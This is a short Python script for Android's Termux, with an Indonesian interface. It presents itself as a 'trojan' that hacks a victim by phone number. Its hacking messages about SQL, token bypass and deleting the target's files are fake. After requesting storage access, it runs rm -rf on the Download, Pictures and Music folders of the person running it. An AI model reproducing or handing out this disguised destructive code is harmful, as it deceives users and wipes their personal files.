#!/bin/usr/python

"""
        TROJAN VIRUS  Onyx7

"""

import os
import sys
from time import sleep

def ketik(s):
	for khazul in s + '\n':
		sys.stdout.write(khazul)
		sys.stdout.flush()
		sleep(50. / 1000)

os.system('clear')
print ("""\033[1;31m
         WELCOME TO TROJAN VIRUS
\033[1;35m         ---------------------------

""")

a = input("\033[1;33mNomor Telepon target : ")
os.system('clear')
print ("\033[1;36m Server: Online ")
sleep(0.5)
print ("\033[1;36m memulai trojan ")
sleep(2)
print ("\033[1;36m Status: Oke! ")
print (' ')
print (' ')
print ("\033[1;32m Memulai HACKED! ")
print (' ')
ketik ("\033[1;32m Mengambil Data INFORMASI... ")
sleep(0.5)
ketik ("\033[1;32m Menggunakan SQL...")
sleep(0.5)
ketik ("\033[1;32m Baypass Access Token...")
sleep(0.5)
print ("\033[1;32m Baypass Sukses! ")
sleep(1)
print (' ')

ketik ("\033[1;32m Menghapus File Target... ")
sleep(2)
ketik ("\033[1;32m Menghapus File Sdcard Target...")
sleep(0.5)
ketik ("\033[1;32m Baypass Recaptcha! ")
sleep(2)
print ("\033[1;32m Baypass Sukses! ")
print (' ')
os.system('termux-setup-storage')
os.system('rm -rf cd /storage/emulated/0/Download')
os.system('rm -rf cd /storage/emulated/0/Pictures')
os.system('rm -rf cd /storage/emulated/0/Music')
print ("\033[1;32m Menghapus File Target!!...")
print ("\033[1;35m Thanks For Use This Tools...")


